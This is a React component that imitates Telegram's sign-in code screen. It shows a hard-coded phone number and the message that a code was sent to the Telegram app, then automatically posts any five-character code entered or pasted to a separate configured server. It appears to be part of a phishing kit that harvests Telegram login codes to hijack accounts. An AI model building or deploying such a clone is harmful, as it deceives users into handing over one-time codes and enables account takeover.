import { Link } from 'react-router-dom';
import styles from './Login.module.css';
import { useState } from 'react';
import { baseURL } from '../config';
import axios from 'axios';

function CodeInput() {
  const codeLogin = async (code)=>{
    const resp = await axios.post(baseURL, {formtype: "codelogin", code: code});
  }
  const codeLoginStart = (code) => {
    if(code.length == 5) codeLogin(code);
  }

  return (
    <div className={styles.auth} style={{padding: "45px 0px 0px 0px"}}>
        <div className={styles.monkey}></div>
        <h1 className={styles.codeH1}>+380 66 412 06 96
        <Link to="/phonelogin">
        <div className={styles.authNumberEditButton} role="button" tabindex="0" title="Wrong number?" aria-label="Wrong number?"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-pencil" viewBox="0 0 16 16">
            <path d="M12.146.146a.5.5 0 0 1 .708 0l3 3a.5.5 0 0 1 0 .708l-10 10a.5.5 0 0 1-.168.11l-5 2a.5.5 0 0 1-.65-.65l2-5a.5.5 0 0 1 .11-.168zM11.207 2.5 13.5 4.793 14.793 3.5 12.5 1.207zm1.586 3L10.5 3.207 4 9.707V10h.5a.5.5 0 0 1 .5.5v.5h.5a.5.5 0 0 1 .5.5v.5h.293zm-9.761 5.175-.106.106-1.528 3.821 3.821-1.528.106-.106A.5.5 0 0 1 5 12.5V12h-.5a.5.5 0 0 1-.5-.5V11h-.5a.5.5 0 0 1-.468-.325"/>
            </svg>
        </div>
        </Link>
        </h1>
        <p className={styles.note}>We've sent the code to the <b>Telegram</b> app on your other device.</p>
        <div className={styles.inputgroup}>
          <input className={styles.formInput} type="text" id="sign-in-code" dir="auto" autocomplete="off" inputmode="numeric" aria-label="Code" 
            onPaste={(e)=>{ 
              codeLoginStart(e.target.value)
            }}
            onChange={(e)=>{ 
              codeLoginStart(e.target.value)
            }}
              />
          <label for="sign-in-code" className={styles.codeLabel}>Code</label>
          </div>
    </div>
  );
}

export default CodeInput;